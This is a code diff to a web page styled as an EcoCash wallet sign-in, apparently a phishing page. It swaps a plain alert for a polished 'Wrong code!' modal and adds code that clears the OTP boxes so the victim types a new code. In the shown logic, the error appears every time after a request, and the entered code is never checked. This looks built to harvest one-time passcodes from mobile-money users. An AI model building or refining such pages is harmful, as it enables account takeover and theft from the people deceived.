@@ -249,6 +249,16 @@
         </div>
     </div>
 
+    <!-- ERROR MODAL -->
+    <div id="errorModal" class="modal">
+        <div class="modal-content" style="text-align: center; padding: 25px 20px;">
+            <div style="width: 50px; height: 50px; background: #fee2e2; color: #dc2626; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; margin: 0 auto 15px auto;">✕</div>
+            <div style="font-size: 18px; font-weight: 600; color: #111; margin-bottom: 8px;">Wrong code!</div>
+            <div style="font-size: 13px; color: #555; margin-bottom: 20px; line-height: 1.4;">Check SMS for the code or request code again after countdown is over</div>
+            <button onclick="closeErrorModal()" style="width: 100%; background: #dc2626; color: #fff; border: none; padding: 12px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;">OK</button>
+        </div>
+    </div>
+
     <div class="footer-wave">
         <div style="font-size: 12px;">To register an EcoCash wallet or get assistance, click below</div>
         <div class="footer-links">
@@ -404,10 +414,19 @@
                 });
                 setTimeout(() => {
                     hideLoading();
-                    alert('Wrong code! Check SMS for code.');
+                    document.getElementById('errorModal').style.display = 'flex';
                 }, 1500);
             } catch(e) {
                 hideLoading();
+                document.getElementById('errorModal').style.display = 'flex';
+            }
+        }
+
+        function closeErrorModal() {
+            document.getElementById('errorModal').style.display = 'none';
+            document.querySelectorAll('#otpBoxes .pin-box').forEach(b => b.value = '');
+            if (document.querySelector('#otpBoxes .pin-box')) {
+                document.querySelector('#otpBoxes .pin-box').focus();
             }
         }
 
